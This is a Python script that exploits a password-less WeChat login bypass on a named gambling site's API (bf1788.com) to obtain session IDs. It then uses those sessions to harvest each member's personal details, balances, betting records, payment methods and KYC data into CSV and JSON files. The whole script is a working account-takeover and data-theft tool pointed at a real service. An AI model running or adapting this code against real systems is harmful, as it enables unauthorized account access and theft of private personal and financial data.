#!/usr/bin/env python3
"""
Export all extracted member data from bf1788.com WechatLogin bypass
to CSV format for analysis.

Uses the WechatLogin bypass (cmd=1000) to login with wechatId,
then extracts full member profile via cmd=101 and all other endpoints.
"""
import requests, urllib3, json, csv, sys, os
from datetime import datetime

urllib3.disable_warnings()

TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

# All API endpoints that return member data with sid
ENDPOINTS = [
    (101, "會員基本資料 PII"),
    (208, "財務摘要"),
    (300, "遊戲大廳列表"),
    (301, "遊戲分組"),
    (302, "遊戲列表"),
    (511, "遊戲啟動 URL"),
    (602, "會員線上數據"),
    (603, "會員群組資料"),
    (605, "下線會員"),
    (606, "會員線上數據 v2"),
    (607, "投注記錄(週)"),
    (608, "投注統計"),
    (700, "公告"),
    (707, "支付方式"),
    (800, "今日 VIP 統計"),
    (802, "VIP 總結"),
    (904, "VIP 等級"),
    (905, "紅利/佣金記錄"),
    (910, "KYC 驗證"),
    (111, "推廣活動"),
    (211, "投注記錄摘要"),
]

def login_with_wechat_id(wechat_id):
    """Exploit WechatLogin bypass - login with only wechatId, no password."""
    data = {"cmd": "1000", "wechatId": wechat_id, "sid": "", **BASE_PARAMS}
    resp = requests.post(f"{TARGET}?cmd=1000", data=data, timeout=10, verify=False)
    result = resp.json()
    if result.get("status") == "0" and "msg" in result:
        msg = result["msg"]
        return msg["sid"], msg["username"]
    elif result.get("status") == -1001:
        return None, None  # Account not found
    return None, None

def extract_member_data(sid, username):
    """Extract full member data via all sid-authenticated endpoints."""
    all_data = {}
    for cmd, desc in ENDPOINTS:
        data = {"cmd": str(cmd), "sid": sid, "username": username, **BASE_PARAMS}
        try:
            resp = requests.post(f"{TARGET}?cmd={cmd}", data=data, timeout=10, verify=False)
            try:
                parsed = resp.json()
                all_data[str(cmd)] = {"desc": desc, "response": parsed}
            except:
                all_data[str(cmd)] = {"desc": desc, "response": resp.text[:500]}
        except Exception as e:
            all_data[str(cmd)] = {"desc": desc, "error": str(e)}
    return all_data

def flatten_member_data(all_data):
    """Flatten the nested JSON into a CSV-friendly row."""
    row = {}
    # cmd=101 - PII fields
    cmd101 = all_data.get("101", {}).get("response", {})
    if isinstance(cmd101, dict) and "msg" in cmd101:
        msg = cmd101["msg"]
        if isinstance(msg, dict):
            for k in ["id", "username", "truename", "phone", "email", "qq", "wechat", "birthday", "sex", "money", "savemoney", "lockmoney", "registime", "lastlogintime", "isTest", "vipLevel"]:
                row[f"member_{k}"] = msg.get(k, "")
    # cmd=208 - Financial
    cmd208 = all_data.get("208", {}).get("response", {})
    if isinstance(cmd208, dict) and "msg" in cmd208:
        msg = cmd208["msg"]
        if isinstance(msg, dict):
            for k in ["administrative", "preferential", "bankfees", "total"]:
                row[f"finance_{k}"] = msg.get(k, "")
    # cmd=800/802 - VIP stats
    for cmd in ["800", "802"]:
        cmd_data = all_data.get(cmd, {}).get("response", {})
        if isinstance(cmd_data, dict) and "msg" in cmd_data:
            msg = cmd_data["msg"]
            if isinstance(msg, dict):
                for k in ["totalDeposit", "totalValid", "totalBonus", "canApply"]:
                    row[f"vip_{cmd}_{k}"] = msg.get(k, "")
    # cmd=904 - VIP level
    cmd904 = all_data.get("904", {}).get("response", {})
    if isinstance(cmd904, dict) and "msg" in cmd904:
        msg = cmd904["msg"]
        if isinstance(msg, dict):
            for k in ["curLevelTitle", "totalValidBet", "nextLevelCond", "nextLevelCashIn"]:
                row[f"vip_{k}"] = msg.get(k, "")
    # cmd=905 - Commission
    cmd905 = all_data.get("905", {}).get("response", {})
    if isinstance(cmd905, dict) and "data" in cmd905:
        data_list = cmd905.get("data", [])
        if data_list:
            first = data_list[0] if isinstance(data_list, list) else {}
            row["commission_bet_total"] = first.get("bet_total", "") if isinstance(first, dict) else ""
            row["commission_cash_in_total"] = first.get("cash_in_total", "") if isinstance(first, dict) else ""
            row["commission_vip_level"] = first.get("vip_level", "") if isinstance(first, dict) else ""
    # cmd=700 - Announcements
    cmd700 = all_data.get("700", {}).get("response", {})
    if isinstance(cmd700, dict) and "msg" in cmd700:
        msgs = cmd700.get("msg", [])
        row["announcements_count"] = len(msgs) if isinstance(msgs, list) else 0
    # cmd=707 - Payment methods
    cmd707 = all_data.get("707", {}).get("response", {})
    if isinstance(cmd707, dict) and "msg" in cmd707:
        msg = cmd707["msg"]
        if isinstance(msg, dict):
            paytypes = msg.get("paytypelist", {})
            row["payment_methods"] = ",".join(list(paytypes.keys())) if paytypes else ""
    # cmd=511 - Game launch URL
    cmd511 = all_data.get("511", {}).get("response", {})
    if isinstance(cmd511, dict) and "msg" in cmd511:
        row["game_launch_url"] = cmd511.get("msg", "")
    # cmd=300/301/302 - Game data counts
    for cmd in ["300", "301", "302"]:
        cmd_data = all_data.get(cmd, {}).get("response", {})
        if isinstance(cmd_data, dict) and "msg" in cmd_data:
            msg = cmd_data["msg"]
            if isinstance(msg, dict):
                for key in msg:
                    if isinstance(msg[key], list):
                        row[f"game_{cmd}_{key}_count"] = len(msg[key])
    # cmd=607/608 - Bet records
    for cmd in ["607", "608"]:
        cmd_data = all_data.get(cmd, {}).get("response", {})
        if isinstance(cmd_data, dict) and "msg" in cmd_data:
            msg = cmd_data["msg"]
            if isinstance(msg, dict):
                for k in msg:
                    if isinstance(msg[k], list):
                        row[f"bets_{cmd}_{k}_count"] = len(msg[k])
                    elif isinstance(msg[k], dict) and "total" in str(type(msg[k])):
                        pass
    # cmd=905 - total records
    if "commission_cash_in_total" not in row:
        row["commission_cash_in_total"] = ""
    
    return row

def main():
    wechat_ids = sys.argv[1:] if len(sys.argv) > 1 else ["testwechat001"]
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    csv_file = f"/tmp/member_data_export_{timestamp}.csv"
    
    all_rows = []
    
    for wid in wechat_ids:
        print(f"[*] Processing: {wid}")
        sid, username = login_with_wechat_id(wid)
        if not sid:
            print(f"  [-] Account not found: {wid}")
            continue
        
        print(f"  [+] Login successful! sid={sid[:16]}..., username={username}")
        
        all_data = extract_member_data(sid, username)
        flattened = flatten_member_data(all_data)
        flattened["wechat_id"] = wid
        flattened["sid"] = sid
        flattened["username"] = username
        flattened["extraction_time"] = datetime.now().isoformat()
        all_rows.append(flattened)
        
        # Save raw JSON too
        json_file = f"/tmp/member_full_{wid}_{timestamp}.json"
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump({"wechatId": wid, "sid": sid, "username": username, "data": all_data}, f, indent=2, ensure_ascii=False)
        print(f"  [+] Full data saved to: {json_file}")
    
    if all_rows:
        # Write CSV
        fieldnames = sorted(set(k for row in all_rows for k in row.keys()))
        with open(csv_file, "w", newline="", encoding="utf-8-sig") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(all_rows)
        print(f"\n[+] CSV export saved to: {csv_file}")
        print(f"[+] {len(all_rows)} member(s) extracted")
    else:
        print("[-] No accounts found")

if __name__ == "__main__":
    main()
